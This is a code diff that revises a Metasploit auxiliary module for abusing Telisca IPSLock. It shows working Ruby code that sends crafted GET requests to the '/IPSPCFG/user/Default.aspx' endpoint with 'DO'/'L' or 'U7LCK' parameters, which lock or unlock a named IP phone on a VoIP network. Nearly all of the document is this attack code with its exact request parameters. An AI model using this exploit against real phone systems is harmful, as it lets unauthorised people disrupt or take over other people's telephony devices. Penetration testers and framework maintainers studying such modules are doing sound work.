@@ -7,137 +7,156 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-  include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Telisca IPSLock Abuse',
-      'Description'    => %q{This modules will exploit the vulnerabilities of Telisca IPSLock , in order to lock/unlock IP Phones.  you need to be in the voip vlan and you have to  know the phone name example : SEP002497AB1D4B .  Set ACTION to either LOCK or UNLOCK UNLOCK is the default.},
+      'Name'           => 'Telisca IPS Lock Control',
+      'Description'    => %q{
+        This modules will exploit the vulnerabilities of Telisca IPSLock in order to lock or unlock
+        IP Phones. You need to be in the voip vlan and you have to know the phone name.
+        Example : SEP002497AB1D4B.
+
+        Set ACTION to either LOCK or UNLOCK. UNLOCK is the default.
+      },
       'References'     =>
-       [
-       ],
+        [
+          # First publicly known resource
+          'URL', 'https://github.com/rapid7/metasploit-framework/pull/6470'
+        ],
       'Author'         =>
-       [
-         'Fakhir Karim Reda <karim.fakhir[at]gmail.com>',
-         'zirsalem'
-       ], 'License'        => MSF_LICENSE,
+        [
+          'Fakhir Karim Reda <karim.fakhir[at]gmail.com>',
+          'zirsalem'
+        ],
       'License'        => MSF_LICENSE,
-      'DisclosureDate' => "Dec 17 2015",
-      'Actions'     =>
+      'DisclosureDate' => 'Dec 17 2015',
+      'Actions'        =>
        [
-         ['LOCK'],
-         ['UNLOCK']
+         ['LOCK', 'Description' => 'To lock a phone'],
+         ['UNLOCK', 'Description' => 'To unlock a phone']
        ],
+       'DefaultAction' => 'UNLOCK'
     ))
+
     register_options(
       [
-        OptString.new('PHONENAME', [true, 'The name of the victim phone ex SEP002497AB1D4B ']),
-        OptString.new('RHOST', [true, 'The IPSLock IP Address']),
-        OptString.new('ACTION', [true, 'LOCK OR UNLOCK','LOCK']),
+        OptAddress.new('RHOST', [true, 'The IPS Lock IP Address']),
+        OptString.new('PHONENAME', [true, 'The name of the victim phone. Ex: SEP002497AB1D4B'])
       ], self.class)
-    deregister_options('RHOSTS')
- end
 
+    deregister_options('RHOSTS')
+  end
+
+  def print_status(msg='')
+    super("#{peer} - #{msg}")
+  end
+
+  def print_good(msg='')
+    super("#{peer} - #{msg}")
+  end
+
+  def print_error(msg='')
+    super("#{peer} - #{msg}")
+  end
+
+  # Returns the status of the listening port.
+  #
+  # @return [Boolean] TrueClass if port open, otherwise FalseClass.
   def port_open?
     begin
-      res = send_request_raw({'method' => 'GET', 'uri' => '/'}, datastore['TIMEOUT'])
+      res = send_request_raw({'method' => 'GET', 'uri' => '/'})
       return true if res
     rescue ::Rex::ConnectionRefused
-      vprint_status("#{peer} - Connection refused")
-      return false
+      vprint_status("Connection refused")
     rescue ::Rex::ConnectionError
-      vprint_error("#{peer} - Connection failed")
-      return false
+      vprint_error("Connection failed")
     rescue ::OpenSSL::SSL::SSLError
-      vprint_error("#{peer} - SSL/TLS connection error")
-      return false
+      vprint_error("SSL/TLS connection error")
     end
+
+    false
   end
 
+  # Locks a device.
   #
-  # Lock a phone .  Function returns true or false
+  # @param phone_name [String] Name of the phone used for the pn parameter.
   #
-  def lock(phone_name,ips_ip)
-    sid = ''
-    begin
-      res = send_request_cgi({
-        'method'    => 'GET',
-        'uri'       => '/IPSPCFG/user/Default.aspx',
-        'vars_get' => {
-          'action'  => 'DO',
-          'tg' => 'L',
-          'pn'       => phone_name,
-          'dp'   => '',
-          'gr'   => '',
-          'gl'   => ''
-       }
-      })
-      if res and res.code == 200
-        if  res.body.include? "Unlock" or res.body.include? "U7LCK"
-          print_good("The deivice  #{phone_name} is already locked")
-        elsif  res.body.include? "unlocked"  or res.body.include? "Locking"  or res.body.include? "QUIT"
-          print_good("Deivice #{phone_name} successfully locked")
-        end
-      else
-        print_error("Lock Request Error #{res.code}")
-        return nil
+  # @return [void]
+  def lock(phone_name)
+    res = send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => '/IPSPCFG/user/Default.aspx',
+      'vars_get'  => {
+        'action'  => 'DO',
+        'tg' => 'L',
+        'pn' => phone_name,
+        'dp' => '',
+        'gr' => '',
+        'gl' => ''
+      }
+    })
+
+    if res && res.code == 200
+      if res.body.include?('Unlock') || res.body.include?('U7LCK')
+        print_good("The device #{phone_name} is already locked")
+      elsif res.body.include?('unlocked') || res.body.include?('Locking') || res.body.include?('QUIT')
+        print_good("Device #{phone_name} successfully locked")
       end
-    rescue ::Exception => e
-      print_error("Error: #{e.to_s}")
-      return nil
+    elsif res
+      print_error("Unexpected response #{res.code}")
+    else
+      print_error('The connection timed out while trying to lock.')
     end
-    return false
- end
-
-  #
-  # Unlock a phone .  Function returns true or false
-  #
-  def unlock(phone_name,ips_ip)
-    begin
-      res = send_request_cgi({
-        'method'    => 'GET',
-        'uri'       => '/IPSPCFG/user/Default.aspx',
-        'headers'   => {
-          'Connection' => 'keep-alive',
-          'Accept-Language' => 'en-US,en;q=0.5'
-        },
-        'vars_get' => {
-          'action'  => 'U7LCK',
-          'pn'       => phone_name,
-          'dp'   => ''
-        }
-      })
-      if res and res.code == 200
-        if  res.body.include? "Unlock" or res.body.include? "U7LCK"
-          print_good("The device  #{phone_name} is already locked")
-          return true
-        elsif  res.body.include? "unlocked"  or res.body.include? "QUIT"
-          print_good("The device #{phone_name} successfully unlocked")
-          return true
-        end
-     else
-       print_error("UNLOCK Request Error #{res.code}")
-       return nil
-     end
-    rescue ::Exception => e
-      print_error("Error: #{e.to_s}")
-      return nil
-    end
-    return nil
   end
+
+
+  # Unlocks a phone.
+  #
+  # @param phone_name [String] Name of the phone used for the pn parameter.
+  #
+  # @return [void]
+  def unlock(phone_name)
+    res = send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => '/IPSPCFG/user/Default.aspx',
+      'headers'   => {
+        'Connection' => 'keep-alive',
+        'Accept-Language' => 'en-US,en;q=0.5'
+      },
+      'vars_get' => {
+        'action' => 'U7LCK',
+        'pn'     => phone_name,
+        'dp'     => ''
+      }
+    })
+
+    if res && res.code == 200
+      if res.body.include?('Unlock') || res.body.include?('U7LCK')
+        print_good("The device #{phone_name} is already locked")
+      elsif res.body.include?('unlocked') || res.body.include?('QUIT')
+        print_good("The device #{phone_name} successfully unlocked")
+      end
+    elsif res
+      print_error("Unexpected response #{res.code}")
+    else
+      print_error('The connection timed out while trying to unlock')
+    end
+  end
+
+
   def run
-    if not port_open?
-      print_error("The web server is unreachable !")
+    unless port_open?
+      print_error('The web server is unreachable!')
       return
     end
+
     phone_name = datastore['PHONENAME']
-    ipsserver = datastore['RHOST']
     case action.name
       when 'LOCK'
-        res = lock(phone_name,ipsserver)
+        lock(phone_name)
       when 'UNLOCK'
-        res = unlock(phone_name,ipsserver)
+        unlock(phone_name)
     end
   end
 end
